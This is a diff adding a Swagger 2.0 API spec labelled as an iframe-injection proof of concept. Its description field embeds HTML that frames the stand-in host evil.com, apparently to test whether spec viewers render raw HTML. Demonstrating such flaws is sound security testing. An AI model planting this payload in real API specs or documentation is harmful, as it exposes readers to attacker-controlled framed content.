@@ -1,0 +1,28 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Simple Iframe Injection PoC
+  description: |
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Iframe Injection Demo</title>
+    </head>
+    <body>
+        <h1>Iframe Injection Vulnerability Demo</h1>
+        <p>Esta é uma demonstração de como um atacante pode injetar um iframe malicioso:</p>
+        
+        <!-- Iframe injection simples -->
+        <iframe src='https://www.evil.com' width='100%' height='600' style='border: 2px solid red;'></iframe>
+        
+        <p style='color: red; font-weight: bold;'>
+            ⚠️ Iframe carregando conteúdo de evil.com
+        </p>
+    </body>
+    </html>
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Iframe injection successful
